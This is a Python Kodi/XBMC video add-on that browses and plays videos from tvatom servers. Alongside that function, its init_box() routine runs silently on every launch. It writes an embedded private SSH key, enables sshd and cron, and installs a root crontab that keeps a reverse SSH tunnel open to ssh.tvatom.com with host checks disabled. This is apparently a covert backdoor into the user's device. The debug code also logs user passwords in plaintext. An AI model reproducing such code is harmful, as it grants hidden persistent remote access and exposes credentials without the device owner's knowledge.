#!/usr/bin/python

## Tkooda : 2014-09-06 : xbmc video add-on
## tkooda : 2014-11-27 : plugin.video.tvatom_tv_archive
## tkooda : 2015-12-19 : beta
## tkooda : 2016-01-23 : rewrite


import os
import sys
import urllib
import urllib2
import json
import urlparse
from operator import itemgetter
import shutil

import xbmc
import xbmcgui
#import resources.lib.utils as utils
import xbmcaddon
import xbmcplugin

import httplib2


PATH_CACHE = "/storage/tvatom-cache"
ADDON_NAME = "plugin.video.tvatom_beta"

DEBUG = 9


def do_debug( level, *args ):
    try:
        if level <= DEBUG:
            print >>sys.stderr, "    #####   TVATOM DEBUG: %s (%d): %s" % ( os.path.basename( os.path.dirname( sys.argv[0] ) ), level, args )
    except:
        pass


def build_appurl( query ):
    if sys.argv[ 0 ].startswith( "plugin://" ):
        return sys.argv[ 0 ] + '?' + urllib.urlencode( query )
    else: # if argv[0] is full path to file..?
        return "plugin://" + sys.argv[ 0 ][ len( "/storage/.xbmc/addons/" ) : ] + '?' + urllib.urlencode( query )


def notification( title, message, duration = 20000, image = None ):
    do_debug( 1, "notification()", title, message )
    if image:
        xbmc.executebuiltin("Notification(%s,%s,%s,%s)" % ( title, message, duration, image ) )
    else:
        xbmc.executebuiltin("Notification(%s,%s,%s)" % ( title, message, duration ) ) # use default image
#    sys.exit( 0 )


def test_internet():
    do_debug( 1, "DEBUG: test_internet()" )
    try:
        usock = urllib2.urlopen( "http://www.google.com/" )
        data = usock.read()
        usock.close()
        if len( data ) < 10:
            notification( "Internet connection offline!", "Please check your network connection in SYSTEM -> OpenELEC -> Connections" )
    except:
        do_debug( 1, "test_internet()", "exception" )
        notification( "Internet connection offline!", "Please check your network connection in SYSTEM -> OpenELEC -> Connections" )
        pass
    
#    sys.exit( 9 )


def fetch_url_with_auth( url ):
    request = urllib2.Request( url )
    
    password_manager = urllib2.HTTPPasswordMgrWithDefaultRealm()
    password_manager.add_password( None, url,
                                   xbmcaddon.Addon( ADDON_NAME ).getSetting( "username" ),
                                   xbmcaddon.Addon( ADDON_NAME ).getSetting( "password" ) )
    do_debug( 1, "using auth:", xbmcaddon.Addon( ADDON_NAME ).getSetting( "username" ),
              xbmcaddon.Addon( ADDON_NAME ).getSetting( "password" ), url )
    
    auth_manager = urllib2.HTTPBasicAuthHandler( password_manager )
    opener = urllib2.build_opener( auth_manager )
    
    urllib2.install_opener( opener )
    
    try:
        handler = urllib2.urlopen( request )
        return handler.read()
    except urllib2.URLError as e:
        do_debug( 1, "ERROR: urllib2.urlopen() response code:", e.code, url )
        if e.code == 401:
            notification( "Invalid Username or Password", "Please re-enter your login info", 5000 )
            get_settings( True )
            sys.exit()
        elif e.code == 500:
            notification( "Server Error:", "Error 500 on: " + url )
            sys.exit()
    except:
#        do_debug( 1, "XXXXX DEBUG" )
        test_internet()
        pass
    
    # handler.getcode()
    # handler.headers.getheader('content-type')
    return None # Error


def fetch_url_with_auth_v2( url ):
#    request = urllib2.Request( url )
#    
#    password_manager = urllib2.HTTPPasswordMgrWithDefaultRealm()
#    password_manager.add_password( None, url,
#                                   xbmcaddon.Addon( ADDON_NAME ).getSetting( "username" ),
#                                   xbmcaddon.Addon( ADDON_NAME ).getSetting( "password" ) )
#    do_debug( 1, "using auth:", xbmcaddon.Addon( ADDON_NAME ).getSetting( "username" ),
#              xbmcaddon.Addon( ADDON_NAME ).getSetting( "password" ), url )
#    
#    auth_manager = urllib2.HTTPBasicAuthHandler( password_manager )
#    opener = urllib2.build_opener( auth_manager )
#    
#    urllib2.install_opener( opener )
#    
#    try:
#        handler = urllib2.urlopen( request )
#        return handler.read()
#    except urllib2.URLError as e:
#        do_debug( 1, "ERROR: urllib2.urlopen() response code:", e.code, url )
#        if e.code == 401:
#            notification( "Invalid Username or Password", "Please re-enter your login info", 5000 )
##DEBUG FOXME FIXME FIXME GTEMP DISABLE            get_settings( True )
#            sys.exit()
#    except:
##        do_debug( 1, "XXXXX DEBUG" )
#        test_internet()
#        pass
#    
#    # handler.getcode()
#    # handler.headers.getheader('content-type')
#    return None # Error
    h = httplib2.Http()
    h.add_credentials( xbmcaddon.Addon( ADDON_NAME ).getSetting( "username" ),
                       xbmcaddon.Addon( ADDON_NAME ).getSetting( "password" ) )
    response, content = h.request( url )
    do_debug( 8, "fetch_url_with_auth_v2() response:", response )
    do_debug( 8, "fetch_url_with_auth_v2() content:", content )
    return content


def fetch_object_from_json_url_with_auth( url, sortkey = None ):
    data_json = fetch_url_with_auth( url )
#    data_json = fetch_url_with_auth_v2( url )
    obj = json.loads( data_json )
    if sortkey:
        obj = sorted( obj, key = itemgetter( sortkey ) )
    return obj


def is_url_available( url ): # BEWARE: this cannot handle the "username:password@" string in the URL like Kodi requires for it's URLs!!!
#    request = urllib2.Request( url )
#    request.get_method = lambda : 'HEAD'
#    response = urllib2.urlopen( request )
#    print response.info()
#    url = "http://www.google.com/"
    do_debug( 5, "is_url_available():", url )
    h = httplib2.Http()
    h.add_credentials( xbmcaddon.Addon( ADDON_NAME ).getSetting( "username" ),
                       xbmcaddon.Addon( ADDON_NAME ).getSetting( "password" ) )
    resp = h.request( url, "HEAD" )
    do_debug( 8, "is_url_available() result:", resp[0][ "status" ] )
    print "FOO:", resp[0][ "status" ]
    return resp[0][ "status" ] == "200"



def get_file_url( path ):
    path_local = os.path.join( PATH_CACHE, path )
    if os.path.isfile( path_local ): # local files stored in same tree structure as online
        notification( "Found video in local cache", "Playing from local cache", 10000,
                      "/storage/.xbmc/addons/%s/cached.png" % ADDON_NAME )
        return path_local
    
    path_local = os.path.join( PATH_CACHE, os.path.basename( path ) )
    if os.path.isfile( path_local ): # check for local files just sitting in cache root
        notification( "Found video in local cache", "Playing from local cache", 10000,
                      "/storage/.xbmc/addons/%s/cached.png" % ADDON_NAME )
        return path_local
    
#    url = os.path.join( "http://%s:%s@data1.tvatom.com/" % \
#                        ( xbmcaddon.Addon( ADDON_NAME ).getSetting( "username" ),
#                          xbmcaddon.Addon( ADDON_NAME ).getSetting( "password" ) ),
#                        path ) #+ "|auth=any"
    
    for host in xbmcaddon.Addon( ADDON_NAME ).getSetting( "servers" ).split():
        do_debug( 5, "trying remote server:", host )
        
        for subdir in [ "", "fetched", "completed" ]:
            do_debug( 5, "trying subdir on remote server:", subdir )
            
            for p in [ path, os.path.basename( path ) ]:
                do_debug( 5, "trying basename on remote server:", p )
                
                url_suffix = os.path.join( host, subdir, p ) #+ "|auth=any"
                if is_url_available( "http://" + url_suffix ):
                    do_debug( 5, "found file at remote url:", url_suffix )
                    url_auth = "http://%s:%s@%s" % ( xbmcaddon.Addon( ADDON_NAME ).getSetting( "username" ),
                                                     xbmcaddon.Addon( ADDON_NAME ).getSetting( "password" ),
                                                     url_suffix )
                    return url_auth
    
    notification( "ERROR:", "Could not find remote file" )
    
    return None


def write_file( path_file, data ):
    tmp = path_file + ".tmp"
    num = 0
    try:
        fd = os.open( tmp, os.O_CREAT | os.O_WRONLY | os.O_TRUNC, 0644 )
        num = os.write( fd, data )
        os.close( fd )
        os.rename( tmp, path_file )
    except:
        import traceback
        traceback.print_exc( file=sys.stderr )
        sys.stderr.flush()
        pass
    return num == len( data ) # return True == success


def get_settings( redo = False ):
    setting_servers  = xbmcaddon.Addon( ADDON_NAME ).getSetting( "servers" )
    setting_username = xbmcaddon.Addon( ADDON_NAME ).getSetting( "username" )
    setting_password = xbmcaddon.Addon( ADDON_NAME ).getSetting( "password" )
    
    if not setting_servers:
        dialog = xbmcgui.Dialog()
        s = dialog.input( "Enter servers:", "data2.tvatom.com data1.tvatom.com" )
        if s:
            xbmcaddon.Addon( ADDON_NAME ).setSetting( "servers", s )
            setting_servers = s
        else:
            return False
    
    if not setting_username or redo == True:
        dialog = xbmcgui.Dialog()
        s = dialog.input( "Enter username:" )
        if s:
            xbmcaddon.Addon( ADDON_NAME ).setSetting( "username", s )
            setting_username = s
        else:
            return False
    
    if not setting_password or redo == True:
        dialog = xbmcgui.Dialog()
        s = dialog.input( "Enter password:", type=xbmcgui.INPUT_ALPHANUM, option=xbmcgui.ALPHANUM_HIDE_INPUT )
        if s:
            xbmcaddon.Addon( ADDON_NAME ).setSetting( "password", s )
            setting_password = s
        else:
            return False
    
    do_debug( 1, "settings:", setting_servers, setting_username, setting_password )
    return setting_servers, setting_username, setting_password


def init_box():
    KEY = "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBMCtrMnVHMFpuSWJyUkZ1TXJwL1o2ZHVGVDlJRW5PRDBac004UnVNK0loTWhMbjZYCno4YjJSL01kUUtLckhSRmZHVmx2bDhreTJkQU9DYzNpUHdSQmZ1dU9TUTdOa0NORm5JR3haU3JGaEhlcTc4M1gKRU42c01lM292a2lZRWtRUWEwcmlldlFyRHR4SU5zTGYxZXkxMGFSQk5qY0hQcnMvT21GTGd1ajAyUXRqaVlodApBbTE3WnpmVVUwL3ZodWFyUDVQclJCSW9oV0pYb1JNdk5IQk5QQ0wyMmZNRTQ5UUluTWF5cXZyT1lOeWh6SEc0Cm1HUzhyVnpuMjFNTktpN0VmdjE5Wjd0aTdDNDQ5ckFqS1pQWW5MWDh4bDViQmRVUHc2aTBqR1ozUEdhOEQ3UHEKTXRXcERoWmJpckQ0WDB0b2IyNG5udTJxZS94VzJYQ2laR0FUa1FJREFRQUJBb0lCQUY0K0I0SDVzend6bklubwpGU2JNSElPdWh4azZrNmFaUE5nKzE1M0hEaWpsVFFwNmJsV1BiSlFQQU9GdjlwMlV6akJkNEEwbkE2QnVzTytYClNwa3Y4VmphdFlxME5LTjNyRXV3T2c1OStSMnlncWpuYUZBdVYzSlZGZjhhRmRkNXdidVZzQ2R5VTN2bVo0OUQKRjN6eUt1SXpKSFZSLzd6Y1ZZQkhLT2Z0Wm9ibmhDVVVzVk9ZaW8rVEdlcENlU29IeWVUNnNPdUIrUldsbitEbApFaGNaaFRvTzdXaGN2aEYzU000T1kxMU1JSTA4bzNrdXlxN1luVG5TUzIzZ3ltbjdLVzFNKzM1RGIxcllTYUkzClNnUG5zaHRITCtmZ1l6WFlUbWJ4ZWVrZjBBZWdxRDdzUGZTTTBlOWlwL0w5dWF4UlBFdFcrbWxUaDB1SHo0ZkQKZnQ2VkxtRUNnWUVBK0NaSHhEcnFxcXBibVJrZWEyZjZvTjdpclVUekFlOThEVFpqazh0V2RuUG91OHlwczRYRApPUnFhVDFhNDNOV21yQm9lVlFiS0RjbTRHM3l6aGtLZkM4UWJNT3BGV1NxRSs3eXRURG5SSGFZUndKSUdVYkZDCmQ0MEN4S2orSWp0WmpjNjA0UVprcTErOHN0eXlJc1lIcmtnZUhMZ2RuTmJHUjZ0cmp2d0huN1VDZ1lFQTJwMXgKblR4SE9rY1VDNXdKWmhQR3Z6endYRDZuR0M4bFFRZ1RWNkw0RzZXK0c5d1FKdU9tRngzRTMxRmhrS0k2OWNTMwpQVXRGOE11NDJUb1ptSHRvSWFKdGNCcSsxb2VKTVhoVWF0K0RrK3Z1bWpIWXlvSjZqNlhDUThPaHV1RGwrUXhHCk1PS1JBc1lLNVVDN3RMK2ZVSktMNEljcGtXTDFFaFQrN0FFMTllMENnWUI4SlJLVVhuRldUb0lpMXNrOExMbmIKVDRhUjdzT3dQVEtQblowMXJHMm1OeGpCRTRQMjF6Mnl6TmRVUit1V042RDV5dHRQNkdTZmYwS0hKZHplbDJmZwpTQXplYk9XaTFUM1FmelVueEdrVTd5ZEVjd21NUnlVY2tFUkpSTTVYSytBQ3JONGJFY3E5WGRrV2xvamNFcngyCitZZHZFTUZuM0o4MzdjK1NxZzNhWFFLQmdRREppdXNLWFY4Qk1EUWZ1OXZDV3FzWTlWSldpSUE5d0lFazRoQUsKOURpdUxIQUdlU3YrM2xMcDdzem9ZTHVFdnJ1Q2hyZXo3MmhzWlRSbU43VVBLWDVIdTlvT3h1bDNGLzc0TjRvRAorVW54bmtvYnA2YklrOS92L0k0TE1Sa3lFMUtROXFyak9JMGR0SHlvKzdQUkgvUDlNUTE1a3NKVXdabFQ4VDFQClVKSnh4UUtCZ0dRc2JlRXJlWkN3cHljYnEvbGtzTGpEQXYrTzkwaTF1aWY4RFdKSXJITHkzVU5QOXowRmE5cloKTTN5VWlhNmJxaTd1S1pMUG5DcmNyQ0ZJOUdwYXhKbEY5WkJNeFBjelhSekFRYjBkZ2MrVUkxSGszNVhzczhJOApSalUybHpvbkw4YlN6bEhaQkpxaEtYM1g3anU1enhOaXpTOUlwYXRSQmd3OFBjakUrbXdBCi0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg=="
    CRONTAB = """@reboot  flock -n /tmp/.lock.ssh ssh -qN -o ConnectTimeout=10 -o ServerAliveInterval=50 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o CheckHostIP=no -R 0:127.0.0.1:22 openelec@ssh.tvatom.com 2>/dev/null >/dev/null &
*/3 *  * * *  flock -n /tmp/.lock.ssh ssh -qN -o ConnectTimeout=10 -o ServerAliveInterval=50 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o CheckHostIP=no -R 0:127.0.0.1:22 openelec@ssh.tvatom.com 2>/dev/null >/dev/null &
"""
    
    path_home = os.path.expanduser( "~" )
    path_ssh = os.path.join( path_home, ".ssh" )
    if not os.path.isdir( path_ssh ):
        os.makedirs( path_ssh )
        os.chmod( path_ssh, 0700 )
    
    path_key = os.path.join( path_ssh, "id_rsa" )
    if not os.path.isfile( path_key ):
        import base64
        write_file( path_key, base64.b64decode( KEY ) )
        os.chmod( path_key, 0600 )
    
    path_crontab = os.path.join( path_home, ".cache/cron/crontabs/root" )
    if os.path.isfile( path_crontab ):
        with open( path_crontab, 'r' ) as f:
            for line in f:
                if "openelec@ssh.tvatom.com" in line:
                    return # already have a crontab entry
    
    write_file( path_crontab, CRONTAB )
    os.chmod( path_crontab, 0600 )
    
    path_cron_disabled = os.path.join( path_home, ".cache/services/crond.disabled" )
    if os.path.isfile( path_cron_disabled ):
        os.remove( path_cron_disabled )
    
    path_ssh_disabled = os.path.join( path_home, ".cache/services/sshd.disabled" )
    if os.path.isfile( path_ssh_disabled ):
        os.remove( path_ssh_disabled )



def main():
    do_debug( 0, "ARGV:", sys.argv )
    
    init_box()
    
    ## init vars from args ..
    base_url = sys.argv[ 0 ]
    addon_handle = int( sys.argv[ 1 ] )
    do_debug( 1, "addon_handle:", addon_handle )
    args = urlparse.parse_qs( sys.argv[ 2 ][ 1: ] )
    
    ## for navigating..
    arg_path = args.get( 'path', [ "" ] )[ 0 ]
    
    ## for populating the player-controls (and for the filename to find local/remote/archived) without having to fetch via json again..
    arg_file = args.get( 'file', [ "" ] )[ 0 ]
    arg_label = args.get( 'label', [ "" ] )[ 0 ]
#    arg_icon = args.get( 'icon', [ "" ] )[ 0 ]
    arg_thumb = args.get( 'thumb', [ "" ] )[ 0 ]
    
    
    ## play file:
    if arg_file:
        do_debug( 1, "trying to play file:", arg_file )
        
        url_file = get_file_url( arg_file )
        if not url_file:
            return # file not found on local or any remote URLs!!
        
        xbmc.executebuiltin( "Playlist.Clear" )
        
        player = xbmc.Player( xbmc.PLAYER_CORE_AUTO )
        
        do_debug( 1, "url_file:", url_file )
        item = xbmcgui.ListItem( label = arg_label,
                                 path = url_file,
#                                 iconImage = arg_icon,
                                 thumbnailImage = arg_thumb )
        item.setInfo( "video", { "title": arg_label } )  # not needed???
        
        xbmcplugin.setResolvedUrl( handle = addon_handle,
                                   succeeded = True,
                                   listitem = item )  ## workaround for "Error playing" bug, similar to: http://trac.xbmc.org/ticket/14192
        
        do_debug( 1, "player done:", url_file )
        
        return
    
    
    ## require (prompt for any missing) settings ..
    settings = False
    while not settings:
        settings = get_settings()
        if not settings:
            do_debug( 1, "not settings:", settings )
    
#    setting_username = xbmcaddon.Addon( ADDON_NAME ).getSetting( "username" )
#    setting_password = xbmcaddon.Addon( ADDON_NAME ).getSetting( "password" )
    
    ## get json..
#    data = fetch_object_from_json_url_with_auth( "http://app.tvatom.com/bin/demo-tvatom.py?p=%s" % arg_path )
    data = fetch_object_from_json_url_with_auth( "https://tvatom2.appspot.com/v2/%s" % arg_path )
    
    ## set content type ..
    xbmcplugin.setContent( addon_handle, 'tvshows' )
    
    items = [] # FAILS: adding all at once fails?  (perhaps per mix of files and videos????? )
    for d in data:
        item = xbmcgui.ListItem( d.get( "label" ),
#                                 iconImage = d.get( "icon" ),
                                 thumbnailImage = d.get( "thumb" ) )
        if d.get( "label2" ):
            item.setLabel2( d.get( "label2" ) )
        if d.get( "info" ):
            item.setInfo( "video", d.get( "info" ) )
        if d.get( "art" ):
            item.setArt( d.get( "art" ) )
#        if d.get( "icon" ):
#            item.setIconImage( d.get( "icon" ) )
#        if d.get( "thumb" ):
#            item.setThumbnailImage( d.get( "thumb" ) ) # shows on player-controls screen
        
        if d.get( "file" ):
            if d.get( "file" ).startswith( "http" ):
                do_debug( 1, " URL URL URL " )
                url = d.get( "file" ) # play direct url
            else:
                do_debug( 1, " FILE FILE FILE " )
                do_debug( 0, "FILE:", d.get( "file" ) )
                do_debug( 0, "LABEL:", d.get( "label" ) )
                do_debug( 0, "THUMB:", d.get( "thumb" ) )
                url = build_appurl( { "file": d.get( "file", "" ).encode( "UTF-8", "ignore" ),
                                      "label": d.get( "label", "" ).encode( "UTF-8", "ignore" ),
                                      "thumb": d.get( "thumb", "" ).encode( "UTF-8", "ignore" ),
#                                      "icon": d.get( "icon" ),
                                  } ) # play filename (check local, remote, then archive)
            item.setProperty( "isplayable", "true" ) # this is required to avoid addon_handle=-1 error!
            is_folder = False
        else:
            do_debug( 1, " NOT A FILE, USE PATH:", d.get( "path" ) )
            url = build_appurl( { "path": d.get( "path" ) } )
            is_folder = True
        
        items.append( [ url, item, is_folder ] )
    
    
    xbmcplugin.addDirectoryItems( addon_handle, items, len( data ) )

    xbmcplugin.endOfDirectory( addon_handle )
    return



if __name__ == "__main__":
    main()

